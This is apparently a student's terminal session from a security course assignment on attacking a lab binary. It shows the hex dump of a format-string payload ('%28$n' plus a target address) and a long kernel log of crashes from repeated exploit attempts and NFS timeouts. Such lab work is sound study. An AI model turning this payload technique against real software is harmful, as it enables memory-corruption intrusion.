ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog1.bin 104 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2532 3824 6e00  AAAAAAAAAA%28$n.
00000020: ac10 6000 0000 00                        ..`....
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog1.bin 104 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg
[2112092.177256]  [<ffffffff8121bbf6>] vfs_getattr+0x26/0x30
[2112092.177261]  [<ffffffff8121bc33>] vfs_fstat+0x33/0x60
[2112092.177266]  [<ffffffff8121c334>] SYSC_newfstat+0x24/0x60
[2112092.177270]  [<ffffffff81215dbf>] ? do_sys_open+0x1bf/0x2a0
[2112092.177276]  [<ffffffff8121c3de>] SyS_newfstat+0xe/0x10
[2112092.177281]  [<ffffffff818552ce>] entry_SYSCALL_64_fastpath+0x22/0xc1
[2112212.174486] INFO: task bash:20362 blocked for more than 120 seconds.
[2112212.174563]       Not tainted 4.4.0-134-generic #160-Ubuntu
[2112212.174603] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[2112212.174658] bash            D ffff88007623ba68     0 20362      1 0x00000000
[2112212.174668]  ffff88007623ba68 ffff88007623ba58 ffff880075daaa00 ffff880077fc7000
[2112212.174674]  ffff88007623c000 ffff88007fd172c0 7fffffffffffffff ffffffff818518f0
[2112212.174680]  ffff88007623bbc8 ffff88007623ba80 ffffffff818510f5 0000000000000000
[2112212.174685] Call Trace:
[2112212.174699]  [<ffffffff818518f0>] ? bit_wait+0x60/0x60
[2112212.174706]  [<ffffffff818510f5>] schedule+0x35/0x80
[2112212.174711]  [<ffffffff81854286>] schedule_timeout+0x1b6/0x270
[2112212.174727]  [<ffffffff8106643e>] ? kvm_clock_get_cycles+0x1e/0x20
[2112212.174731]  [<ffffffff818518f0>] ? bit_wait+0x60/0x60
[2112212.174737]  [<ffffffff81850864>] io_schedule_timeout+0xa4/0x110
[2112212.174741]  [<ffffffff8185190b>] bit_wait_io+0x1b/0x70
[2112212.174745]  [<ffffffff8185149f>] __wait_on_bit+0x5f/0x90
[2112212.174754]  [<ffffffff811940db>] wait_on_page_bit+0xcb/0xf0
[2112212.174762]  [<ffffffff810c8900>] ? autoremove_wake_function+0x40/0x40
[2112212.174767]  [<ffffffff811941f3>] __filemap_fdatawait_range+0xf3/0x160
[2112212.174774]  [<ffffffff81196071>] ? __filemap_fdatawrite_range+0xd1/0x100
[2112212.174779]  [<ffffffff81194274>] filemap_fdatawait_range+0x14/0x30
[2112212.174785]  [<ffffffff811961bf>] filemap_write_and_wait_range+0x3f/0x70
[2112212.174817]  [<ffffffffc04f6323>] nfs_file_fsync+0x83/0x140 [nfs]
[2112212.174827]  [<ffffffff8124b99e>] vfs_fsync_range+0x4e/0xb0
[2112212.174833]  [<ffffffff81196697>] generic_file_write_iter+0x137/0x1e0
[2112212.174847]  [<ffffffffc04f65fa>] nfs_file_write+0x9a/0x170 [nfs]
[2112212.174855]  [<ffffffff81216455>] new_sync_write+0xa5/0xf0
[2112212.174860]  [<ffffffff812164c9>] __vfs_write+0x29/0x40
[2112212.174865]  [<ffffffff81216e79>] vfs_write+0xa9/0x1a0
[2112212.174870]  [<ffffffff81215dbf>] ? do_sys_open+0x1bf/0x2a0
[2112212.174875]  [<ffffffff81217b35>] SyS_write+0x55/0xc0
[2112212.174882]  [<ffffffff818552ce>] entry_SYSCALL_64_fastpath+0x22/0xc1
[2112212.174887] INFO: task bash:20422 blocked for more than 120 seconds.
[2112212.174932]       Not tainted 4.4.0-134-generic #160-Ubuntu
[2112212.174971] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[2112212.175033] bash            D ffff880077eb7b28     0 20422      1 0x00000004
[2112212.175039]  ffff880077eb7b28 ffff880051247ec8 ffff88007ca00e00 ffff880034ced400
[2112212.175044]  ffff880077eb8000 ffff88007fd172c0 7fffffffffffffff ffffffff818518f0
[2112212.175049]  ffff880077eb7c88 ffff880077eb7b40 ffffffff818510f5 0000000000000000
[2112212.175054] Call Trace:
[2112212.175059]  [<ffffffff818518f0>] ? bit_wait+0x60/0x60
[2112212.175064]  [<ffffffff818510f5>] schedule+0x35/0x80
[2112212.175069]  [<ffffffff81854286>] schedule_timeout+0x1b6/0x270
[2112212.175088]  [<ffffffffc0505b40>] ? nfs_do_writepage+0x1c0/0x1c0 [nfs]
[2112212.175094]  [<ffffffff8106643e>] ? kvm_clock_get_cycles+0x1e/0x20
[2112212.175098]  [<ffffffff818518f0>] ? bit_wait+0x60/0x60
[2112212.175104]  [<ffffffff81850864>] io_schedule_timeout+0xa4/0x110
[2112212.175107]  [<ffffffff8185190b>] bit_wait_io+0x1b/0x70
[2112212.175111]  [<ffffffff8185149f>] __wait_on_bit+0x5f/0x90
[2112212.175116]  [<ffffffff811940db>] wait_on_page_bit+0xcb/0xf0
[2112212.175121]  [<ffffffff810c8900>] ? autoremove_wake_function+0x40/0x40
[2112212.175125]  [<ffffffff811941f3>] __filemap_fdatawait_range+0xf3/0x160
[2112212.175130]  [<ffffffff81196071>] ? __filemap_fdatawrite_range+0xd1/0x100
[2112212.175134]  [<ffffffff81194274>] filemap_fdatawait_range+0x14/0x30
[2112212.175139]  [<ffffffff8119613a>] filemap_write_and_wait+0x6a/0x70
[2112212.175157]  [<ffffffffc0506870>] nfs_wb_all+0x20/0x120 [nfs]
[2112212.175172]  [<ffffffffc04fa850>] nfs_getattr+0x120/0x240 [nfs]
[2112212.175179]  [<ffffffff8121b97f>] vfs_getattr_nosec+0x2f/0x40
[2112212.175184]  [<ffffffff8121bbf6>] vfs_getattr+0x26/0x30
[2112212.175189]  [<ffffffff8121bc33>] vfs_fstat+0x33/0x60
[2112212.175195]  [<ffffffff8121c334>] SYSC_newfstat+0x24/0x60
[2112212.175200]  [<ffffffff81215dbf>] ? do_sys_open+0x1bf/0x2a0
[2112212.175205]  [<ffffffff8121c3de>] SyS_newfstat+0xe/0x10
[2112212.175210]  [<ffffffff818552ce>] entry_SYSCALL_64_fastpath+0x22/0xc1
[2113458.742288] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114187.820318] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114187.820385] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114187.820411] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114393.449466] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114418.201115] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114488.328187] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114493.080203] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114522.663706] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2114530.807589] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2116078.234519] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2116137.041687] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2120801.219211] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2120826.938984] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2126368.345328] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2126568.006665] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2155502.469208] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2155541.348696] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2155856.448426] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2156369.473523] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2156464.060223] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2156595.166408] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2160419.907885] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2160419.908285] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908331] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908352] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908394] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908703] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908735] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908760] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908777] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908794] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908818] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908836] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.908980] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909002] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909026] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909050] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909066] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909083] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909100] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909192] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909250] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909275] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909309] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909451] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909493] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909727] nfs: server vader.srcit.stevens-tech.edu OK
[2160419.909753] nfs: server vader.srcit.stevens-tech.edu OK
[2160455.043021] mount: server vader.srcit.stevens-tech.edu not responding, timed out
[2160728.119368] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2161458.230692] nfs: server vader.srcit.stevens-tech.edu OK
[2162189.867882] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2162384.938079] nfs: server vader.srcit.stevens-tech.edu OK
[2165071.207384] a.out[5481]: segfault at c0 ip 00007f5ff6f28194 sp 00007ffdccb88030 error 4 in libc-2.23.so[7f5ff6edb000+1c0000]
[2165251.936601] a.out[5653]: segfault at 0 ip 00007f37149d1264 sp 00007ffcac0982f0 error 4 in libc-2.23.so[7f3714964000+1c0000]
[2165418.281783] a.out[5846]: segfault at 0 ip 00007f01aa772264 sp 00007ffe896c8920 error 4 in libc-2.23.so[7f01aa705000+1c0000]
[2165429.866183] traps: vuln_prog1.bin[5848] general protection ip:5576d35a0a25 sp:7ffc83bfbf38 error:0 in vuln_prog1.bin[5576d35a0000+1000]
[2165440.014182] traps: vuln_prog1.bin[5852] general protection ip:55b0acf20a25 sp:7fffbd3d1a88 error:0 in vuln_prog1.bin[55b0acf20000+1000]
[2165960.199762] traps: vuln_prog1.bin[5964] general protection ip:555fd175ea25 sp:7ffeb0614f28 error:0 in vuln_prog1.bin[555fd175e000+1000]
[2166013.713280] traps: vuln_prog1.bin[5980] general protection ip:55a548281a25 sp:7ffd5b1a6088 error:0 in vuln_prog1.bin[55a548281000+1000]
[2166037.694737] traps: vuln_prog1.bin[5994] general protection ip:559a4b1ada25 sp:7fff013db708 error:0 in vuln_prog1.bin[559a4b1ad000+1000]
[2168659.985855] traps: stack_overflow[6975] general protection ip:400627 sp:7ffecf2a95b8 error:0 in stack_overflow[400000+1000]
[2168716.738781] traps: stack_overflow[6999] general protection ip:400627 sp:7ffdd1ee0a78 error:0 in stack_overflow[400000+1000]
[2170007.584685] stack_overflow[7467]: segfault at 40 ip 0000000000000040 sp 00007ffe120231d0 error 14 in stack_overflow[400000+1000]
[2173687.051740] a.out[8921]: segfault at 0 ip 00007f2ddc069264 sp 00007ffd72912020 error 4 in libc-2.23.so[7f2ddbffc000+1c0000]
[2173711.990552] a.out[8928]: segfault at 0 ip 00007fb6f8e01264 sp 00007ffffe519af0 error 4 in libc-2.23.so[7fb6f8d94000+1c0000]
[2173741.643931] traps: text2bin[8946] general protection ip:400868 sp:7fff1522cc88 error:0 in text2bin[400000+1000]
[2174350.115230] a.out[9093]: segfault at 0 ip 00007efc802bc6f8 sp 00007ffe9eeb2d40 error 4 in libc-2.23.so[7efc8024e000+1c0000]
[2174406.000506] a.out[9254]: segfault at 0 ip 00007f21a476e6f8 sp 00007ffe296329c0 error 4 in libc-2.23.so[7f21a4700000+1c0000]
[2174560.135167] a.out[9306]: segfault at 0 ip 00007f20a08cd6f8 sp 00007ffd39e095b0 error 4 in libc-2.23.so[7f20a085f000+1c0000]
[2174946.465839] a.out[9382]: segfault at 0 ip 00007feed60e06f8 sp 00007fff4d77c460 error 4 in libc-2.23.so[7feed6072000+1c0000]
[2175542.409849] a.out[9559]: segfault at 0 ip 00007f913332faee sp 00007ffc83a07940 error 4 in libc-2.23.so[7f91332c2000+1c0000]
[2175587.625683] a.out[9579]: segfault at 0 ip 00007fde259eaaee sp 00007ffcaa87faf0 error 4 in libc-2.23.so[7fde2597d000+1c0000]
[2175649.302546] a.out[9594]: segfault at 0 ip 00007fa5f4f20aee sp 00007ffe06519e50 error 4 in libc-2.23.so[7fa5f4eb3000+1c0000]
[2181006.457838] text2bin[11603]: segfault at 0 ip 00007f7f378a9c10 sp 00007ffc784976a0 error 6 in libc-2.23.so[7f7f3783c000+1c0000]
[2181037.803961] text2bin[11615]: segfault at 4005e0 ip 00007ff74a2acc10 sp 00007ffea7657a40 error 7 in libc-2.23.so[7ff74a23f000+1c0000]
[2181062.102506] text2bin[11725]: segfault at 4005e0 ip 00007f38ef64ec10 sp 00007ffc5401eb20 error 7 in libc-2.23.so[7f38ef5e1000+1c0000]
[2181373.771105] text2bin[11949]: segfault at 4005e0 ip 00007fcd772c2c10 sp 00007ffc612e3500 error 7 in libc-2.23.so[7fcd77255000+1c0000]
[2181563.007039] text2bin[11984]: segfault at 4005e0 ip 00007fec5d7adc10 sp 00007fff0b90cc30 error 7 in libc-2.23.so[7fec5d740000+1c0000]
[2182360.798306] text2bin[12285]: segfault at 4005e0 ip 00007f048f2efc10 sp 00007fffe138a380 error 7 in libc-2.23.so[7f048f282000+1c0000]
[2182363.179771] text2bin[12291]: segfault at 4005e0 ip 00007fb0168d7c10 sp 00007ffed6bc7e20 error 7 in libc-2.23.so[7fb01686a000+1c0000]
[2184329.026727] text2bin[13199]: segfault at 7ffd6c000000 ip 00007fc784c0e532 sp 00007ffd6c852a60 error 4 in libc-2.23.so[7fc784b8a000+1c0000]
[2184608.293653] text2bin[13275]: segfault at 7ffd68000000 ip 00007f85dec14532 sp 00007ffd6be68cb0 error 4 in libc-2.23.so[7f85deb90000+1c0000]
[2189880.217486] bin2indexed[16625]: segfault at 1c216f8 ip 0000000000400ada sp 00007ffda213e100 error 4 in bin2indexed[400000+1000]
[2191699.759276] bin2text[17511]: segfault at 4006b0 ip 00007f19274d2c80 sp 00007ffec1d93920 error 7 in libc-2.23.so[7f1927464000+1c0000]
[2191735.155514] bin2text[17529]: segfault at 4006b0 ip 00007f7d1aae7c80 sp 00007ffcfc2bd8e0 error 7 in libc-2.23.so[7f7d1aa79000+1c0000]
[2192041.151654] bin2text[17632]: segfault at 400720 ip 00007f8c6c37ec80 sp 00007ffcd0c86280 error 7 in libc-2.23.so[7f8c6c310000+1c0000]
[2192546.151287] bin2text[17873]: segfault at 4006d0 ip 00007fc95ccf8c80 sp 00007ffd09604e40 error 7 in libc-2.23.so[7fc95cc8a000+1c0000]
[2192569.065067] bin2text[17884]: segfault at 400720 ip 00007fa8f42e0c80 sp 00007ffe1a86de40 error 7 in libc-2.23.so[7fa8f4272000+1c0000]
[2192593.312572] bin2text[17894]: segfault at 400720 ip 00007f9f8b0ffc80 sp 00007ffc04166270 error 7 in libc-2.23.so[7f9f8b091000+1c0000]
[2192741.920032] bin2text[17932]: segfault at 400720 ip 00007f4a153dbc80 sp 00007ffcc0ef8500 error 7 in libc-2.23.so[7f4a1536d000+1c0000]
[2193143.388989] bin2text[18075]: segfault at 400760 ip 00007f7cff3c5c80 sp 00007ffd74e986d0 error 7 in libc-2.23.so[7f7cff357000+1c0000]
[2201744.660469] stack_overflow[21324]: segfault at 400005da ip 00000000400005da sp 00007fff27da4ee0 error 14 in libc-2.23.so[7fb50cb2e000+1c0000]
[2202519.550400] stack_overflow[21480]: segfault at 409296e2 ip 00000000409296e2 sp 00007ffd12f68e50 error 14 in libc-2.23.so[7f962e11c000+1c0000]
[2204602.925930] ptrace of pid 22153 was attempted by: gdb (pid 22169)
[2211105.648312] vuln_prog1.bin[25074]: segfault at 55adc50009a4 ip 000055adc50009a4 sp 00007ffc6ca3f420 error 14 in vuln_prog1.bin[55adc56c2000+1000]
[2211392.925494] vuln_prog1.bin[25196]: segfault at 55f9000a09a4 ip 000055f9000a09a4 sp 00007ffd8ebe48c0 error 14 in vuln_prog1.bin[55f920cb6000+1000]
[2211853.992102] vuln_prog1.bin[25647]: segfault at 55ba000a09a4 ip 000055ba000a09a4 sp 00007ffe784add40 error 14 in vuln_prog1.bin[55baee669000+1000]
[2212227.291687] vuln_prog1.bin[25877]: segfault at 5555000a09a4 ip 00005555000a09a4 sp 00007fffffffdc60 error 14 in vuln_prog1.bin[555555554000+1000]
[2214578.147077] traps: vuln_prog1.bin[26627] general protection ip:55d6034d1a25 sp:7fff5af91598 error:0 in vuln_prog1.bin[55d6034d1000+1000]
[2214630.526912] vuln_prog1.bin[26646]: segfault at 5555555549a4 ip 00005555555549a4 sp 00007ffce3925700 error 14 in vuln_prog1.bin[556a0e34a000+1000]
[2214924.967738] vuln_prog1.bin[26745]: segfault at 5555555549a4 ip 00005555555549a4 sp 00007ffee2c0a8a0 error 14 in vuln_prog1.bin[55b4940c6000+1000]
[2253690.930344] text2bin[6692]: segfault at 400962 ip 00007fb7b40ce729 sp 00007fff043f6e38 error 7 in libc-2.23.so[7fb7b4040000+1c0000]
[2253933.998354] text2bin[6744]: segfault at 31 ip 00007f03059c9924 sp 00007ffdea9788e0 error 4 in libc-2.23.so[7f030598e000+1c0000]
[2254198.641001] text2bin[6804]: segfault at 31 ip 00007f19a0450454 sp 00007ffd49dd3630 error 4 in libc-2.23.so[7f19a0415000+1c0000]
[2255228.414631] traps: vuln_prog1.bin[7174] general protection ip:55dd12e4da25 sp:7fffe23b8ba8 error:0 in vuln_prog1.bin[55dd12e4d000+1000]
[2255342.281356] traps: vuln_prog1.bin[7191] general protection ip:55dc0e303a25 sp:7ffd78c32bc8 error:0 in vuln_prog1.bin[55dc0e303000+1000]
[2255367.784990] traps: vuln_prog1.bin[7199] general protection ip:55fcbea5aa25 sp:7ffe55b04288 error:0 in vuln_prog1.bin[55fcbea5a000+1000]
[2255798.145034] traps: vuln_prog1.bin[7500] general protection ip:5634aeb44a25 sp:7ffd54b34148 error:0 in vuln_prog1.bin[5634aeb44000+1000]
[2260833.002045] traps: vuln_prog1.bin[8950] general protection ip:55a6e00cca25 sp:7fff151b0ef8 error:0 in vuln_prog1.bin[55a6e00cc000+1000]
[2260857.415093] traps: vuln_prog1.bin[8957] general protection ip:55bf8b059a25 sp:7fff261a0048 error:0 in vuln_prog1.bin[55bf8b059000+1000]
[2260902.558126] traps: vuln_prog1.bin[8967] general protection ip:56160ebaea25 sp:7ffce3d98988 error:0 in vuln_prog1.bin[56160ebae000+1000]
[2261009.986016] traps: vuln_prog1.bin[8987] general protection ip:561b2e996a25 sp:7ffd5c401d28 error:0 in vuln_prog1.bin[561b2e996000+1000]
[2261039.793152] vuln_prog1.bin[8993]: segfault at 0 ip           (null) sp 00007ffd21b8001a error 14 in vuln_prog1.bin[55c5771a2000+1000]
[2261305.430782] vuln_prog1.bin[9224]: segfault at 0 ip           (null) sp 00007ffe4351001a error 14 in vuln_prog1.bin[55bcd74e4000+1000]
[2261321.152708] vuln_prog1.bin[9228]: segfault at 20 ip 0000000000000020 sp 00007fffaa3c9910 error 14 in vuln_prog1.bin[564b7b4bc000+1000]
[2261384.845490] vuln_prog1.bin[9251]: segfault at 0 ip           (null) sp 00007ffc74f5f710 error 14 in vuln_prog1.bin[55b5047ad000+1000]
[2268787.504829] vuln[13023]: segfault at f76f9300 ip 00000000f76f9300 sp 00000000ffb817f4 error 15 in libc-2.23.so[f76f9000+1000]
[2279370.249339] traps: vuln_prog1.bin[16490] general protection ip:559a4e562a25 sp:7ffef1462ed8 error:0 in vuln_prog1.bin[559a4e562000+1000]
[2279435.087836] traps: vuln_prog1.bin[16509] general protection ip:560e506b8a25 sp:7fff76fd1098 error:0 in vuln_prog1.bin[560e506b8000+1000]
[2279533.371609] traps: vuln_prog1.bin[16552] trap stack segment ip:561a1d500a8b sp:7ffc367f2d90 error:0 in vuln_prog1.bin[561a1d500000+1000]
[2279551.059495] vuln_prog1.bin[16557]: segfault at 0 ip           (null) sp 00007ffc01dc0019 error 14 in vuln_prog1.bin[562f9c2a4000+1000]
[2279569.674041] vuln_prog1.bin[16563]: segfault at 9a0414141 ip 0000561808917a8b sp 00007ffd0a417080 error 4 in vuln_prog1.bin[561808917000+1000]
[2279616.018811] vuln_prog1.bin[16572]: segfault at 0 ip           (null) sp 00007ffda2ca5b10 error 14 in vuln_prog1.bin[56142083d000+1000]
[2279623.785674] vuln_prog1.bin[16576]: segfault at 7f0009a04141 ip 000055650919ba8b sp 00007ffe2ff2c950 error 4 in vuln_prog1.bin[55650919b000+1000]
[2279814.622768] traps: vuln_prog1.bin[16619] general protection ip:559e6995ea25 sp:7ffed724cdf8 error:0 in vuln_prog1.bin[559e6995e000+1000]
[2279870.392984] vuln_prog1.bin[16631]: segfault at 55a5fe750009 ip 000055a5fe750009 sp 00007fffb55f32b0 error 14 in vuln_prog1.bin[55a5fe754000+1000]
[2279977.428819] traps: vuln_prog1.bin[16648] general protection ip:55fb2a889a25 sp:7ffc253e59f8 error:0 in vuln_prog1.bin[55fb2a889000+1000]
[2280048.795469] traps: vuln_prog1.bin[16668] general protection ip:564a7b50ca25 sp:7ffdc5632968 error:0 in vuln_prog1.bin[564a7b50c000+1000]
[2280313.256929] traps: vuln_prog1.bin[16735] general protection ip:55fcd6d17a25 sp:7ffe949a6918 error:0 in vuln_prog1.bin[55fcd6d17000+1000]
[2280882.966171] traps: vuln_prog1.bin[17013] general protection ip:55da7375aa25 sp:7fffa0c36888 error:0 in vuln_prog1.bin[55da7375a000+1000]
[2280903.571007] traps: vuln_prog1.bin[17018] general protection ip:555c6d2bba25 sp:7ffc23e8ef18 error:0 in vuln_prog1.bin[555c6d2bb000+1000]
[2280963.961813] traps: vuln_prog1.bin[17030] general protection ip:555b35ed9a25 sp:7ffc03bab318 error:0 in vuln_prog1.bin[555b35ed9000+1000]
[2280975.286164] traps: vuln_prog1.bin[17034] general protection ip:55fb09f65a25 sp:7ffca4fe51a8 error:0 in vuln_prog1.bin[55fb09f65000+1000]
[2280993.011129] vuln_prog1.bin[17039]: segfault at 0 ip           (null) sp 00007ffddd78001a error 14 in vuln_prog1.bin[55899da81000+1000]
[2281106.245047] traps: vuln_prog1.bin[17058] general protection ip:55924511ca25 sp:7fffb67d25f8 error:0 in vuln_prog1.bin[55924511c000+1000]
[2281112.730523] traps: vuln_prog1.bin[17061] general protection ip:562a35d04a25 sp:7ffdc0214f68 error:0 in vuln_prog1.bin[562a35d04000+1000]
[2281124.004480] vuln_prog1.bin[17066]: segfault at 55ac000a4141 ip 000055ac000a4141 sp 00007ffe77d505a0 error 14 in vuln_prog1.bin[55ac30de6000+1000]
[2281147.030816] vuln_prog1.bin[17072]: segfault at 55f7003c600a ip 000055f7003c600a sp 00007ffdbe29dd60 error 14 in vuln_prog1.bin[55f75d91d000+1000]
[2281156.633173] vuln_prog1.bin[17076]: segfault at a41414141 ip 000055cb2785ba8b sp 00007fff5e424210 error 4 in vuln_prog1.bin[55cb2785b000+1000]
[2281383.227912] vuln_prog1.bin[17120]: segfault at 0 ip           (null) sp 00007fff5079001a error 14 in vuln_prog1.bin[556767ca2000+1000]
[2281710.126269] vuln_prog1.bin[17172]: segfault at 14 ip 00007f0dcda59ea3 sp 00007fff710cbe10 error 4 in ld-2.23.so[7f0dcda4e000+26000]
[2281866.631074] traps: vuln_prog1.bin[17209] general protection ip:7fd720c9fb29 sp:7ffef5f03f10 error:0 in ld-2.23.so[7fd720c94000+26000]
[2282527.768029] traps: vuln_prog1.bin[17480] trap stack segment ip:556ef127aa09 sp:7ffd3fbd1190 error:0 in vuln_prog1.bin[556ef127a000+1000]
[2282538.537984] traps: vuln_prog1.bin[17484] trap stack segment ip:556e5e986a09 sp:7ffc544e0630 error:0 in vuln_prog1.bin[556e5e986000+1000]
[2283201.296442] traps: vuln_prog1.bin[17632] general protection ip:55767d0a4a25 sp:7ffc3f5e67d8 error:0 in vuln_prog1.bin[55767d0a4000+1000]
[2283211.198977] traps: vuln_prog1.bin[17636] general protection ip:55dca4d71a25 sp:7ffd248ad398 error:0 in vuln_prog1.bin[55dca4d71000+1000]
[2283222.971848] traps: vuln_prog1.bin[17641] general protection ip:5608d7292a25 sp:7ffcc221c528 error:0 in vuln_prog1.bin[5608d7292000+1000]
[2283324.838648] traps: vuln_prog1.bin[17666] general protection ip:5653eb865a25 sp:7ffd415852a8 error:0 in vuln_prog1.bin[5653eb865000+1000]
[2283365.332430] traps: vuln_prog1.bin[17675] general protection ip:55d0717b0a25 sp:7fff335314d8 error:0 in vuln_prog1.bin[55d0717b0000+1000]
[2283408.259601] vuln_prog1.bin[17683]: segfault at 5636360009a0 ip 00005636360009a0 sp 00007fff462add70 error 14 in vuln_prog1.bin[563636ac7000+1000]
[2283417.105087] vuln_prog1.bin[17688]: segfault at 557c83ee0009 ip 0000557c83ee0009 sp 00007ffee2839770 error 14 in vuln_prog1.bin[557c83eea000+1000]
[2283427.065372] vuln_prog1.bin[17697]: segfault at 5601e02f0009 ip 00005601e02f0009 sp 00007ffdc04089f0 error 14 in vuln_prog1.bin[5601e02f6000+1000]
[2284969.324311] vuln_prog1.bin[18131]: segfault at 559caf4c0009 ip 0000559caf4c0009 sp 00007ffc74792530 error 14 in vuln_prog1.bin[559caf4c1000+1000]
[2284977.607619] vuln_prog1.bin[18135]: segfault at 560f450009a0 ip 0000560f450009a0 sp 00007ffc31612670 error 14 in vuln_prog1.bin[560f45962000+1000]
[2284988.877030] vuln_prog1.bin[18139]: segfault at a ip 000000000000000a sp 00007ffebcf62a10 error 14 in vuln_prog1.bin[55c59fe2f000+1000]
[2284995.658033] vuln_prog1.bin[18143]: segfault at 0 ip           (null) sp 00007ffc28d70019 error 14 in vuln_prog1.bin[558f4c639000+1000]
[2285107.497326] vuln_prog1.bin[18169]: segfault at 564e4b2b0009 ip 0000564e4b2b0009 sp 00007ffca0cc9250 error 14 in vuln_prog1.bin[564e4b2b8000+1000]
[2285118.667646] traps: vuln_prog1.bin[18174] trap stack segment ip:55c256b74a09 sp:7ffd83fcd510 error:0 in vuln_prog1.bin[55c256b74000+1000]
[2285687.971749] vuln_prog1.bin[18297]: segfault at 5581de550009 ip 00005581de550009 sp 00007fffdb5eb820 error 14 in vuln_prog1.bin[5581de55b000+1000]
[2285775.269192] traps: vuln_prog1.bin[18312] trap stack segment ip:564aec4a9a09 sp:7ffcf0134910 error:0 in vuln_prog1.bin[564aec4a9000+1000]
[2285782.290850] vuln_prog1.bin[18316]: segfault at 5601b10009a0 ip 00005601b10009a0 sp 00007ffd6a6b6bd0 error 14 in vuln_prog1.bin[5601b1cb6000+1000]
[2285818.755049] vuln_prog1.bin[18324]: segfault at 7fff390009a0 ip 00005615cb0ffa8b sp 00007fff3909b720 error 4 in vuln_prog1.bin[5615cb0ff000+1000]
[2285824.957977] vuln_prog1.bin[18328]: segfault at 7fff0009a041 ip 000055f8c84fea8b sp 00007fffe2c23830 error 4 in vuln_prog1.bin[55f8c84fe000+1000]
[2285831.698803] vuln_prog1.bin[18332]: segfault at 7f0009a04141 ip 000056469c2baa8b sp 00007ffd0df47ed0 error 4 in vuln_prog1.bin[56469c2ba000+1000]
[2285838.497290] vuln_prog1.bin[18335]: segfault at 9a0414141 ip 0000560d6b612a8b sp 00007ffe4df525c0 error 4 in vuln_prog1.bin[560d6b612000+1000]
[2285849.088247] vuln_prog1.bin[18340]: segfault at 9a041414141 ip 00005644f4020a8b sp 00007ffe04acc690 error 4 in vuln_prog1.bin[5644f4020000+1000]
[2285854.960856] traps: vuln_prog1.bin[18344] trap stack segment ip:55d6fb0f6a8b sp:7fffe6725390 error:0 in vuln_prog1.bin[55d6fb0f6000+1000]
[2285861.503473] traps: vuln_prog1.bin[18348] trap stack segment ip:55990896da09 sp:7ffd57dff080 error:0 in vuln_prog1.bin[55990896d000+1000]
[2287156.851585] vuln_prog1.bin[18731]: segfault at 14 ip 00007ff56c740ea3 sp 00007ffe0bd40830 error 4 in ld-2.23.so[7ff56c735000+26000]
[2287208.856182] vuln_prog1.bin[18747]: segfault at 0 ip           (null) sp 00007ffee385001a error 14 in vuln_prog1.bin[5593c1a28000+1000]
[2287219.130260] vuln_prog1.bin[18752]: segfault at 7ffc003c0a41 ip 0000560631726a8b sp 00007ffc1f1cc5d0 error 4 in vuln_prog1.bin[560631726000+1000]
[2287232.894120] vuln_prog1.bin[18756]: segfault at 7fff000a4141 ip 000055e3b34bda8b sp 00007fff700f8960 error 4 in vuln_prog1.bin[55e3b34bd000+1000]
[2287240.527645] traps: vuln_prog1.bin[18760] trap stack segment ip:557fecd8ca8b sp:7fffe9db9d10 error:0 in vuln_prog1.bin[557fecd8c000+1000]
